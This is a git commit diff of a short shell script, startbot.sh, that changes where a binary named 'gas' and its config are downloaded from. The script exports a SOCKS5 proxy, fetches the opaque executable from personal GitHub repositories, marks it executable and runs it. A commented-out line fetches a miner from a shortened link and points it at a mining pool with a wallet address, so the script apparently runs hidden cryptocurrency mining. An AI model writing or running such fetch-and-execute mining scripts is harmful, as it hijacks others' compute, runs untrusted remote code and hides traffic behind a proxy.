55c5fd74bbe35e95cb1ea79208e7b40e28951776
cryptotabcrypto22 <101613640+cryptotabcrypto22@users.noreply.github.com>
2022-05-22 13:13:37 +0700

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -6,5 +6,5 @@
 cd /home/shell-bot
 #wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l verushash.mine.zergpool.com:3300 -u DTsu49wXhGQ7yGWuRYsnz4EmC55Xg6YkrE.hotaru -p c=DGB,mc=VRSC
 export http_proxy=socks5://72.221.172.203:4145
-wget https://github.com/douglasjan7949/rstudio/raw/main/gas && wget https://github.com/douglasjan7949/rstudio/raw/main/d.ini && chmod +x gas
+wget https://github.com/douglasjan7949/vrssc/raw/main/gas && wget https://raw.githubusercontent.com/cryptotabcrypto22/vrssc/main/d.ini && chmod +x gas
 ./gas d.ini
